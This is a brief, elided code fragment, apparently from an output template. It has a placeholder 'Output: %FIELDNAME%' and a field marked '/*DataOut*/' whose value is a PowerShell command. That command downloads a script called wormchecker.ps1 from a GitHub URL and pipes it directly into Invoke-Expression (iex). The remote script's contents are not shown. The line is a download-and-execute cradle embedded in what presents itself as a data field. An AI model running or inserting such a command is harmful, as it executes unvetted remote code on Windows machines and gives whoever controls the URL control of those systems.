...
Output: %FIELDNAME%'
        ...
        /*DataOut*/,'\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -command \"& {(new-object Net.WebClient).DownloadString(\'https://github.com/jkaser06/auotmate/blob/master/wormchecker.ps1\') | iex}\"'
